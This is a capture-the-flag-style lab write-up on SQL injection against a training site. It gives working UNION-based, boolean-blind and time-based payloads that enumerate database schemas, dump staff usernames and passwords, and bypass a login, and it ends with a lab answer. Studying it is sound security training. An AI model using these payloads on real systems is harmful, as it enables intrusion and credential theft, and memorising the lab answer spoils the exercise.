
## **SQL Injection**

### **Task-5**

By entering this we found that we have something on 2 and three

```
https://website.thm/article?id=0 UNION SELECT 1,2,3--+
```

Now let’s find the name of database using this

```
https://website.thm/article?id=0 UNION SELECT 1,2,database()--+
```

Database name found is sqli_one

Now running this, we found table schema and the column names in it

```
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = "sqli_one" -- +
```

We found three table name so now we will use it

We will use staff_users here

```
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = "staff_users" -- +
```

Now we found 3 columns

```
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(username,":",password) FROM staff_users -- +
```

### **Task-6**

Now for Blind SQL Injection, we will change username to

```
Admin' or 1=1;--
```

### **Task-7**

By using this we came to know that there are 3 columns

```
https://website.thm/checkuser?username=admin' UNION SELECT 1,2,3;--
```

Now we will enter this

```
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like 'sq%';--
```

By this we will try each word by word to find the final ans being

sqli_three which is the name of database

Now same way we do with table_name

```
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
```

We got table name users like this

```
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
```

```
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
```

```
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id'
```

Now by this we found username admin and we will also find the password

```
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
```

### **Task-8**

```
https://website.thm/analytics?referrer=admin' UNION SELECT SLEEP(5);--
```

```
https://website.thm/analytics?referrer=admin' UNION SELECT SLEEP(5),2;--
```

```
https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2; from user where username= ‘admin’ and password like ‘x%’;--

pass 4961